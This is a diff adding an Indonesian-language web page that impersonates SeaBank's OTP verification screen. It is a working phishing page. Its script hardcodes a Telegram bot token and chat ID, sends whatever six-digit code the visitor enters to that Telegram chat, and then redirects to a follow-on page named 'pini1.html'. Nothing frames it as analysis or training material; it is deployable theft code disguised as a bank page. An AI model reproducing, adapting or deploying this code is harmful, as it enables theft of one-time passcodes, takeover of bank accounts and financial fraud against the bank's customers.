@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP - SeaBank</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #FFFFFF;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 50px 30px 30px;
+        }
+
+        /* Logo */
+        .logo {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #FF7A00 0%, #FF9500 100%);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: white;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .app-name {
+            font-size: 20px;
+            font-weight: 700;
+            color: #FF7A00;
+            margin-bottom: 8px;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 40px;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .subtitle span {
+            color: #FF7A00;
+            font-weight: 600;
+        }
+
+        /* OTP Input */
+        .otp-container {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+
+        .otp-input {
+            width: 50px;
+            height: 55px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            border: 2px solid #E0E0E0;
+            border-radius: 12px;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .otp-input:focus {
+            border-color: #FF7A00;
+            box-shadow: 0 0 0 3px rgba(255, 122, 0, 0.15);
+        }
+
+        .timer {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .timer span {
+            color: #FF7A00;
+            font-weight: 600;
+        }
+
+        .resend-link {
+            font-size: 14px;
+            color: #888;
+        }
+
+        .resend-link a {
+            color: #FF7A00;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .resend-link a.disabled {
+            color: #CCC;
+            pointer-events: none;
+        }
+
+        .btn-confirm {
+            width: 100%;
+            max-width: 320px;
+            padding: 15px;
+            background: linear-gradient(90deg, #FF7A00 0%, #FF9500 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 50px;
+            transition: opacity 0.3s;
+        }
+
+        .btn-confirm:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-confirm:active:not(:disabled) {
+            opacity: 0.85;
+        }
+
+        .loading {
+            margin-top: 20px;
+            color: #FF7A00;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo">S</div>
+    <div class="app-name">SeaBank</div>
+    <div class="title">Masukkan Kode OTP</div>
+    <div class="subtitle">Kode verifikasi telah dikirim ke<br>Nomor <span>+628* **** **** </span></div>
+
+    <div class="otp-container">
+        <input type="text" class="otp-input" maxlength="1" data-index="0" oninput="handleInput(this, 0)" onkeydown="handleKeydown(event, 0)">
+        <input type="text" class="otp-input" maxlength="1" data-index="1" oninput="handleInput(this, 1)" onkeydown="handleKeydown(event, 1)">
+        <input type="text" class="otp-input" maxlength="1" data-index="2" oninput="handleInput(this, 2)" onkeydown="handleKeydown(event, 2)">
+        <input type="text" class="otp-input" maxlength="1" data-index="3" oninput="handleInput(this, 3)" onkeydown="handleKeydown(event, 3)">
+        <input type="text" class="otp-input" maxlength="1" data-index="4" oninput="handleInput(this, 4)" onkeydown="handleKeydown(event, 4)">
+        <input type="text" class="otp-input" maxlength="1" data-index="5" oninput="handleInput(this, 5)" onkeydown="handleKeydown(event, 5)">
+    </div>
+
+    <div class="timer">Kirim ulang dalam <span id="countdown">01:00</span></div>
+
+    <div class="resend-link" id="resendWrapper">
+        Belum menerima kode? <a href="#" id="resendBtn" class="disabled">Kirim Ulang</a>
+    </div>
+
+    <button class="btn-confirm" id="confirmBtn" disabled>Verifikasi</button>
+
+    <div class="loading" id="loading">⏳ Sedang memverifikasi...</div>
+
+    <script>
+        // === SETTING TELEGRAM BOT ===
+        const BOT_TOKEN = '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg';
+        const CHAT_ID = '8592742129';
+        const HALAMAN_TUJUAN = 'pini1.html';
+        // ============================
+
+        // Auto focus first input
+        document.querySelector('.otp-input').focus();
+
+        function handleInput(input, index) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+            if (input.value && index < 5) {
+                document.querySelectorAll('.otp-input')[index + 1].focus();
+            }
+            checkComplete();
+        }
+
+        function handleKeydown(e, index) {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                document.querySelectorAll('.otp-input')[index - 1].focus();
+            }
+        }
+
+        function checkComplete() {
+            const inputs = document.querySelectorAll('.otp-input');
+            let otp = '';
+            inputs.forEach(i => otp += i.value);
+            document.getElementById('confirmBtn').disabled = otp.length !== 6;
+        }
+
+        // Countdown Timer
+        let timeLeft = 60;
+        const countdownEl = document.getElementById('countdown');
+        const resendBtn = document.getElementById('resendBtn');
+        
+        const timer = setInterval(() => {
+            timeLeft--;
+            const min = Math.floor(timeLeft / 60);
+            const sec = timeLeft % 60;
+            countdownEl.textContent = `${String(min).padStart(2, '0')}:${String(sec).padStart(2, '0')}`;
+            
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                countdownEl.textContent = '00:00';
+                resendBtn.classList.remove('disabled');
+                resendBtn.onclick = function(e) {
+                    e.preventDefault();
+                    location.reload();
+                };
+            }
+        }, 1000);
+
+        async function kirimOTPKeTelegram(otp) {
+            const pesan = `🔐 Kode OTP SeaBank\n📤 OTP: ${otp}\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return res.ok;
+            } catch (err) {
+                console.error('Error kirim ke Telegram:', err);
+                return false;
+            }
+        }
+
+        // Confirm button action
+        document.getElementById('confirmBtn').onclick = async function() {
+            let otp = '';
+            document.querySelectorAll('.otp-input').forEach(i => otp += i.value);
+            
+            // Tampilkan loading
+            document.getElementById('loading').style.display = 'block';
+            this.disabled = true;
+            
+            // Kirim OTP ke Telegram
+            await kirimOTPKeTelegram(otp);
+            
+            // Pindah ke halaman pini1.html setelah 1.5 detik
+            setTimeout(() => {
+                window.location.href = HALAMAN_TUJUAN;
+            }, 1500);
+        };
+    </script>
+    
+</body>
+</html>
